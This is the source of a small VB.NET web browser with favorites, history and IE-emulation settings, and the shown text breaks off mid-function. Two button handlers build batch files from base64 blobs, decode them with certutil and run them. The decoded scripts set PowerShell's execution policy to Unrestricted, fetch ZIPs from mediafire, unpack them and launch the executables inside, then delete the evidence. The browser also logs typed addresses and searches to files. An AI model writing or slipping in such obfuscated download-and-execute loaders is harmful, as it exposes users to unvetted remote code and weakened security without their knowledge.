﻿Imports Microsoft.Win32
Public Class Browser
    Private Sub Browser_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If My.Settings.IE11bool = True Then
            ToolStripMenuItem1.Checked = True
        End If
        If ToolStripMenuItem1.Checked = True Then
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE10bool = True Then
            ToolStripMenuItem3.Checked = True
        End If
        If ToolStripMenuItem3.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE9bool = True Then
            ToolStripMenuItem4.Checked = True
        End If
        If ToolStripMenuItem4.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE8bool = True Then
            ToolStripMenuItem6.Checked = True
        End If
        If ToolStripMenuItem6.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE7bool = True Then
            ToolStripMenuItem5.Checked = True
        End If
        If ToolStripMenuItem5.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
        End If
        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", Nothing) Is Nothing Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 11000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.IE11bool = True
            My.Settings.Save()
            Application.Restart()
        Else
        End If
        If My.Settings.UseMySave = True Then
            UseMySaveToolStripMenuItem.Checked = True
            Call UseMySaveToolStripMenuItem_Click(Me, e)
        End If
        If My.Settings.HomePage = True Then
            UseMyHomeToolStripMenuItem.Checked = True
            Call UseMyHomeToolStripMenuItem_Click(Me, e)
            GoTo Started
        End If
        PictureBox7.Visible = False
        Me.WebBrowser1.AllowNavigation = True
        Me.WebBrowser1.AllowWebBrowserDrop = True
        My.Settings.Youtube = "https://www.youtube.com/"
        WebBrowser1.Navigate(My.Settings.Youtube)
Started:
        FavorisToolStripMenuItem.Text = "Favorites"
        AddToolStripMenuItem.Text = "Add"
        If System.IO.Directory.Exists("Favoris") = False Then
            System.IO.Directory.CreateDirectory("Favoris")
        End If
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\Favoris\Favoris.Bro") Then
            Dim sr As New IO.StreamReader(Application.StartupPath & "\Favoris\Favoris.Bro")
            For Each item As String In My.Settings.Favoris
                Dim item1 As New ToolStripMenuItem
                item1.Text = item.ToString
                FavorisToolStripMenuItem.DropDown.Items.Add(sr.ReadLine)
            Next
        End If
        For Each C As ToolStripMenuItem In FavorisToolStripMenuItem.DropDownItems
            AddHandler C.Click, AddressOf FavorisToolStripMenuItem_Click
        Next
        If Label13.Text = Nothing Then
            Label15.Visible = False
            Label16.Visible = False
        End If
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label12.Text = Times
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\License.Times") = False Then
            Label15.Visible = False
            Label16.Visible = False
            GoTo EndSub
        End If
        Dim reader3 As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label14.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader3.ReadLine()))
        Dim date1 As Date = CDate(Label12.Text)
        Dim date2 As Date = CDate(Label14.Text)
        Dim result As Integer = DateTime.Compare(date1, date2)
        If result < 0 Then
            Label13.Text = "is earlier than"
            Label15.Visible = True
            Label11.Visible = False
            Label16.Visible = True
            GoTo EndSub
        ElseIf result = 0 Then
            Label13.Text = "is the same time as"
            Label15.Visible = False
            Label11.Visible = True
            Label16.Visible = False
            GoTo EndSub
        Else
            Label13.Text = "is later than"
            Label15.Visible = False
            Label11.Visible = True
            Label16.Visible = False
        End If
        GoTo EndSub
EndSub:
    End Sub
    Private Sub FavorisToolStripMenuItem_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        WebBrowser1.Navigate(sender.ToString)
    End Sub
    Private Sub AddToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddToolStripMenuItem.Click
        Dim item1 As New ToolStripMenuItem
        item1.Text = WebBrowser1.Url.ToString
        FavorisToolStripMenuItem.DropDownItems.Add(item1)
        My.Settings.Favoris = WebBrowser1.Url.ToString
        My.Settings.Save()
        If System.IO.Directory.Exists("Favoris") = False Then
            System.IO.Directory.CreateDirectory("Favoris")
        End If
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter("Favoris\Favoris.Bro", True)
        file.WriteLine(item1.Text)
        file.Close()
    End Sub
    Private Sub Browser_FormClosed(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles MyBase.FormClosed
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
        End If
        My.Settings.Save()
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter("Historique\LastAddress.Bro", True)
        file.WriteLine(Times & TxtAddress.Text)
        file.Close()
    End Sub
    Private Sub TxtAddress_TextChanged(sender As Object, e As EventArgs) Handles TxtAddress.TextChanged
        If TxtAddress.Text = "Search" Then
            TxtAddress.Text = ""
        End If
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
        End If
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter("Historique\Historiques.Bro", True)
        file.WriteLine(Times & TxtAddress.Text)
        file.Close()
    End Sub
    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
        TxtAddress.Text = WebBrowser1.Url.ToString()
        WebBrowser1.ScriptErrorsSuppressed = True
        Dim Size As Integer = 100
        Dim MyWeb As Object
        MyWeb = WebBrowser1.ActiveXInstance
        MyWeb.ExecWb(63, 2, Convert.ToInt32(Size), "NULL")
    End Sub
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        If WebBrowser1.CanGoBack Then
            WebBrowser1.GoBack()
        End If
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        If WebBrowser1.CanGoForward Then
            WebBrowser1.GoForward()
        End If
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        WebBrowser1.Refresh()
    End Sub
    Private Sub TxtSearch_TextChanged(sender As Object, e As EventArgs) Handles TxtSearch.Click
        If TxtSearch.Text = "Search" Then
            TxtSearch.Text = ""
        End If
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
        End If
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter("Historique\Historiques.Bro", True)
        file.WriteLine(Times & TxtSearch.Text)
        file.Close()
    End Sub
    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        WebBrowser1.Navigate(TxtAddress.Text)
        TxtAddress.Text = WebBrowser1.Url.ToString()
    End Sub
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        My.Settings.Google = "http://www.google.com/search?q="
        WebBrowser1.Navigate(My.Settings.Google & TxtSearch.Text)
    End Sub
    Private Sub WebBrowser1_Navigated(ByVal sender As Object, ByVal e As WebBrowserNavigatedEventArgs) Handles WebBrowser1.Navigated
        TxtAddress.Text = WebBrowser1.Url.ToString()
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        If (IO.File.Exists("AdvancedYoutubeDownloader.bat")) Then GoTo AdvancedYoutubeDownloader
        Call AdvancedYoutubeDownloader()
        GoTo EndSub
AdvancedYoutubeDownloader:
        Process.Start("AdvancedYoutubeDownloader.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub AdvancedYoutubeDownloader()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci5leGUgZ290byBBWUQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2VkWW91dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci5l>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eGUgZ290byBTdGFydEFZRA0KOkFZRCANCkBlY2hvIG9mZg0KdGl0bGUgQVlEDQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKg0KZWNobyAgICoqKi8vIFVwZGF0ZS1BWUQuYmF0IC8vIFdpbjEwIC8vKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo DQplY2hvICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo KioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0ICV+ZHAwXEFZRFwgcm1kaXIgL3Mg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3EgJX5kcDBcQVlEXA0KaWYgZXhpc3QgJX5kcDBcQVlETGluay5iYXQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxBZHZhbmNlZFlv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dXR1YmVEb3dubG9hZGVyLnppcCBkZWwgL3MgL3EgJX5kcDBcQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXANCmlmIGV4aXN0ICV+ZHAwXEFZRC50eHQgZGVsIC9z>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXEFZRC50eHQNCmlmIGV4aXN0ICV+ZHAwXEFZRC5GaWxlIGRlbCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cyAvcSAlfmRwMFxBWUQuRmlsZQ0KaWYgZXhpc3QgJX5kcDBcQVlELnBzMSBkZWwg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcQVlELnBzMQ0KaWYgZXhpc3QgJX5kcDBcVW56aXBBWUQucHMx>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxVbnppcEFZRC5wczENCnBvd2Vyc2hlbGwgU2V0LUV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIgVW5yZXN0cmljdGVkDQpw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1ZXN0ICJodHRwOi8vd3d3>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Lm1lZGlhZmlyZS5jb20vZmlsZS93YWhicGpxZm5uaXQ1eHovQWR2YW5jZWRZb3V0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dWJlRG93bmxvYWRlci56aXAiIC1PdXRGaWxlICJBWUQudHh0Ig0KY2QgJX5kcDAN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo CmZpbmQgL0kgImhyZWY9J2h0dHA6Ly8iIEFZRC50eHQ+PkFZRExpbmsuYmF0DQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvIEV4aXQ+PkFZRExpbmsuYmF0DQplY2hvIEtFZGxkQzFEYjI1MFpXNTBJRUZa>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UkV4cGJtc3VZbUYwS1NCOElBMEtSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmY+PkFZ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RC5GaWxlDQplY2hvIElDMXlaWEJzWVdObElDSm9jbVZtUFNjaUxDQWlldzBLZUhs>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Nk16SXhJbjBnZkNBTkNsTmxkQzFEYjI1MFpXNTA+PkFZRC5GaWxlDQplY2hvIElF>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RlpSRXhwYm1zdVltRjBEUW9rYUdGemFDNG5JRDBuRFFvb1IyVjBMVU52Ym5SbGJu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UWdRVmxFVEdsdWF5NWk+PkFZRC5GaWxlDQplY2hvIFlYUXBJSHdnRFFwR2IzSmxZ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo V05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoWTJVZ0lpUm9ZWE5vTGljaUxDQWk+>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo PkFZRC5GaWxlDQplY2hvIERRcDZlWGcwTlNKOUlId2dEUXBUWlhRdFEyOXVkR1Z1>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZENCQldVUk1hVzVyTG1KaGRBMEtEUW9vUjJWMExVTnY+PkFZRC5GaWxlDQplY2hv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IGJuUmxiblFnUVZsRVRHbHVheTVpWVhRcElId2dEUXBHYjNKbFlXTm9MVTlpYW1W>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo amRDQjdKRjhnTFhKbGNHeGg+PkFZRC5GaWxlDQplY2hvIFkyVWdJbmg1ZWpNeU1T>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo SXNJQ0p3YjNkbGNuTm9aV3hzSUMxRGIyMXRZVzVrSUVsdWRtOXJaUzFYWldKU1pY>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RjE+PkFZRC5GaWxlDQplY2hvIFpYTjBJQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Q0JCV1VSTWFXNXJMbUpoZEEwS0tFZGxkQzFEYjI1MFpXNTA+PkFZRC5GaWxlDQpl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2hvIElFRlpSRXhwYm1zdVltRjBLU0I4SUEwS1JtOXlaV0ZqYUMxUFltcGxZM1Fn>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZXlSZklDMXlaWEJzWVdObElDSXU+PkFZRC5GaWxlDQplY2hvIGVta2lMQ0FpTG5w>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cGNDQXRUM1YwUm1sc1pTQkJaSFpoYm1ObFpGbHZkWFIxWW1WRWIzZHViRzloWkdW>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eUxucHA+PkFZRC5GaWxlDQplY2hvIGNDQW1KaUJsZUdsMEluMGdmQ0FOQ2xObGRD>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo MURiMjUwWlc1MElFRlpSRXhwYm1zdVltRjA+PkFZRC5GaWxlDQp0aW1lb3V0IC9U>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IDENCmNlcnR1dGlsIC1kZWNvZGUgQVlELkZpbGUgQVlELnBzMQ0KdGltZW91dCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo VCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBBWUQucHMxIC1Ob0V4aXQNCnRpbWVv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dXQgL1QgMQ0KZmluZCAvSSAicG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZva2UtV2Vi>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo UmVxdWVzdCBodHRwIiBBWURMaW5rLmJhdD4+QVlERG93bmxvYWRMaW5rLmJhdA0K>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo Y2QgJX5kcDAgJiYgc3RhcnQgQVlERG93bmxvYWRMaW5rLmJhdA0KdGltZW91dCAv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo VCAyMg0KY2QgJX5kcDANCmlmIG5vdCBleGlzdCAlfmRwMFxBWURcIG1rZGlyICV+>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZHAwXEFZRFwNCmVjaG8gRXhwYW5kLUFyY2hpdmUgLVBhdGggIkFkdmFuY2VkWW91>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHViZURvd25sb2FkZXIuemlwIiAtRGVzdGluYXRpb25QYXRoICIlfmRwMFwiPj4i>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IlVuemlwQVlELnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmls>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZSBVbnppcEFZRC5wczEgLU5vRXhpdA0KdGltZW91dCAvVCAyDQppZiBleGlzdCAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWURcIHJtZGlyIC9zIC9xICV+ZHAwXEFZRFwNCmlmIGV4aXN0ICV+ZHAw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo XEFZRERvd25sb2FkTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXEFZRERvd25sb2Fk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo TGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEFZRExpbmsuYmF0IGRlbCAvcyAvcSAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWURMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcQWR2YW5jZWRZb3V0dWJl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RG93bmxvYWRlci56aXAgZGVsIC9zIC9xICV+ZHAwXEFkdmFuY2VkWW91dHViZURv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo d25sb2FkZXIuemlwDQppZiBleGlzdCAlfmRwMFxBWUQudHh0IGRlbCAvcyAvcSAl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo fmRwMFxBWUQudHh0DQppZiBleGlzdCAlfmRwMFxBWUQuRmlsZSBkZWwgL3MgL3Eg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo JX5kcDBcQVlELkZpbGUNCmlmIGV4aXN0ICV+ZHAwXEFZRC5wczEgZGVsIC9zIC9x>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ICV+ZHAwXEFZRC5wczENCmlmIGV4aXN0ICV+ZHAwXFVuemlwQVlELnBzMSBkZWwg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcVW56aXBBWUQucHMxDQppZiBub3QgZXhpc3QgJX5kcDBcQWR2>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YW5jZWRZb3V0dWJlRG93bmxvYWRlclxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVy>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo LmV4ZSBnb3RvIFdlYnBhZ2VBWUQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFuY2VkWW91>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHViZURvd25sb2FkZXJcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci5leGUgZ290>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo byBTdGFydEFZRA0KOlN0YXJ0QVlEDQpjZCAlfmRwMFxBZHZhbmNlZFlvdXR1YmVE>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo b3dubG9hZGVyXCAmJiBzdGFydCBBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVyLmV4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZQ0KaWYgZXhpc3QgJX5kcDBcQVlEXCBybWRpciAvcyAvcSAlfmRwMFxBWURcDQpp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZiBleGlzdCAlfmRwMFxBWURMaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBcQVlETGlu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXIu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo emlwIGRlbCAvcyAvcSAlfmRwMFxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVyLnpp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cA0KaWYgZXhpc3QgJX5kcDBcQVlELnR4dCBkZWwgL3MgL3EgJX5kcDBcQVlELnR4>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dA0KaWYgZXhpc3QgJX5kcDBcQVlELkZpbGUgZGVsIC9zIC9xICV+ZHAwXEFZRC5G>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aWxlDQppZiBleGlzdCAlfmRwMFxBWUQucHMxIGRlbCAvcyAvcSAlfmRwMFxBWUQu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo cHMxDQppZiBleGlzdCAlfmRwMFxVbnppcEFZRC5wczEgZGVsIC9zIC9xICV+ZHAw>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo XFVuemlwQVlELnBzMQ0KZ290byBFbmRBWUQNCjpXZWJwYWdlQVlEDQpzdGFydCBo>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS93YWhicGpxZm5uaXQ1eHovQWR2>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YW5jZWRZb3V0dWJlRG93bmxvYWRlci56aXAuemlwDQpnb3RvIEVuZEFZRA0KOkVu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZEFZRA0KZ290byBFeGl0DQo6RXhpdA0KRXhpdA0K>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("certutil -decode AdvancedYoutubeDownloader.Files AdvancedYoutubeDownloader.bat")
        sb.AppendLine("start AdvancedYoutubeDownloader.bat")
        sb.AppendLine("if exist AdvancedYoutubeDownloader.Files del /s /q AdvancedYoutubeDownloader.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("AYD.bat", sb.ToString())
        Process.Start("AYD.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("AYD.bat")
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        If (IO.File.Exists("MediaPlayer.bat")) Then GoTo MediaPlayer
        Call MediaPlayer()
        GoTo EndSub
MediaPlayer:
        Process.Start("MediaPlayer.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub MediaPlayer()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo Ok1lZGlhUGxheWVyDQpAZWNobyBvZmYNCmlmIG5vdCBleGlzdCAlfmRwMFxNZWRp>>MediaPlayer.Files")
        sb.AppendLine("echo YVBsYXllclxNZWRpYVBsYXllci5leGUgZ290byBNUA0KaWYgZXhpc3QgJX5kcDBc>>MediaPlayer.Files")
        sb.AppendLine("echo TWVkaWFQbGF5ZXJcTWVkaWFQbGF5ZXIuZXhlIGdvdG8gU3RhcnRNUA0KOk1QIA0K>>MediaPlayer.Files")
        sb.AppendLine("echo QGVjaG8gb2ZmDQp0aXRsZSBNUA0KZWNobyAgICoqKioqKioqKioqKioqKioqKioq>>MediaPlayer.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioNCmVjaG8gICAqKiovLyBVcGRhdGUt>>MediaPlayer.Files")
        sb.AppendLine("echo TVAuYmF0IC8vIFdpbjEwIC8vKioqDQplY2hvICAgKioqKioqKioqKioqKioqKioq>>MediaPlayer.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KY2QgJX5kcDANCmlmIGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1QXCBybWRpciAvcyAvcSAlfmRwMFxNUFwNCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXE1QTGluay5iYXQNCmlmIGV4aXN0>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1lZGlhUGxheWVyLnppcCBkZWwgL3MgL3EgJX5kcDBcTWVkaWFQbGF5>>MediaPlayer.Files")
        sb.AppendLine("echo ZXIuemlwDQppZiBleGlzdCAlfmRwMFxNUC50eHQgZGVsIC9zIC9xICV+ZHAwXE1Q>>MediaPlayer.Files")
        sb.AppendLine("echo LnR4dA0KaWYgZXhpc3QgJX5kcDBcTVAuRmlsZSBkZWwgL3MgL3EgJX5kcDBcTVAu>>MediaPlayer.Files")
        sb.AppendLine("echo RmlsZQ0KaWYgZXhpc3QgJX5kcDBcTVAucHMxIGRlbCAvcyAvcSAlfmRwMFxNUC5w>>MediaPlayer.Files")
        sb.AppendLine("echo czENCmlmIGV4aXN0ICV+ZHAwXFVuemlwTVAucHMxIGRlbCAvcyAvcSAlfmRwMFxV>>MediaPlayer.Files")
        sb.AppendLine("echo bnppcE1QLnBzMQ0KcG93ZXJzaGVsbCBTZXQtRXhlY3V0aW9uUG9saWN5IC1TY29w>>MediaPlayer.Files")
        sb.AppendLine("echo ZSBDdXJyZW50VXNlciBVbnJlc3RyaWN0ZWQNCnBvd2Vyc2hlbGwgLUNvbW1hbmQg>>MediaPlayer.Files")
        sb.AppendLine("echo SW52b2tlLVdlYlJlcXVlc3QgImh0dHA6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxl>>MediaPlayer.Files")
        sb.AppendLine("echo L3hlNWk0bTAzcWVuMTFjci9NZWRpYVBsYXllci56aXAiIC1PdXRGaWxlICJNUC50>>MediaPlayer.Files")
        sb.AppendLine("echo eHQiDQpjZCAlfmRwMA0KZmluZCAvSSAiaHJlZj0naHR0cDovLyIgTVAudHh0Pj5N>>MediaPlayer.Files")
        sb.AppendLine("echo UExpbmsuYmF0DQplY2hvIEV4aXQ+Pk1QTGluay5iYXQNCmVjaG8gS0VkbGRDMURi>>MediaPlayer.Files")
        sb.AppendLine("echo MjUwWlc1MElFMVFUR2x1YXk1aVlYUXBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmpk>>MediaPlayer.Files")
        sb.AppendLine("echo Q0I3SkY4Zz4+TVAuRmlsZQ0KZWNobyBMWEpsY0d4aFkyVWdJbWh5WldZOUp5SXNJ>>MediaPlayer.Files")
        sb.AppendLine("echo Q0o3RFFwNGVYb3pNakVpZlNCOElBMEtVMlYwTFVOdmJuUmxiblFnPj5NUC5GaWxl>>MediaPlayer.Files")
        sb.AppendLine("echo DQplY2hvIFRWQk1hVzVyTG1KaGRBMEtKR2hoYzJndUp5QTlKdzBLS0VkbGRDMURi>>MediaPlayer.Files")
        sb.AppendLine("echo MjUwWlc1MElFMVFUR2x1YXk1aVlYUXA+Pk1QLkZpbGUNCmVjaG8gSUh3Z0RRcEdi>>MediaPlayer.Files")
        sb.AppendLine("echo M0psWVdOb0xVOWlhbVZqZENCN0pGOGdMWEpsY0d4aFkyVWdJaVJvWVhOb0xpY2lM>>MediaPlayer.Files")
        sb.AppendLine("echo Q0FpRFFwNj4+TVAuRmlsZQ0KZWNobyBlWGcwTlNKOUlId2dEUXBUWlhRdFEyOXVk>>MediaPlayer.Files")
        sb.AppendLine("echo R1Z1ZENCTlVFeHBibXN1WW1GMERRb05DaWhIWlhRdFEyOXVkR1Z1Pj5NUC5GaWxl>>MediaPlayer.Files")
        sb.AppendLine("echo DQplY2hvIGRDQk5VRXhwYm1zdVltRjBLU0I4SUEwS1JtOXlaV0ZqYUMxUFltcGxZ>>MediaPlayer.Files")
        sb.AppendLine("echo M1FnZXlSZklDMXlaWEJzWVdObElDSjQ+Pk1QLkZpbGUNCmVjaG8gZVhvek1qRWlM>>MediaPlayer.Files")
        sb.AppendLine("echo Q0FpY0c5M1pYSnphR1ZzYkNBdFEyOXRiV0Z1WkNCSmJuWnZhMlV0VjJWaVVtVnhk>>MediaPlayer.Files")
        sb.AppendLine("echo V1Z6ZENBaT4+TVAuRmlsZQ0KZWNobyBmU0I4SUEwS1UyVjBMVU52Ym5SbGJuUWdU>>MediaPlayer.Files")
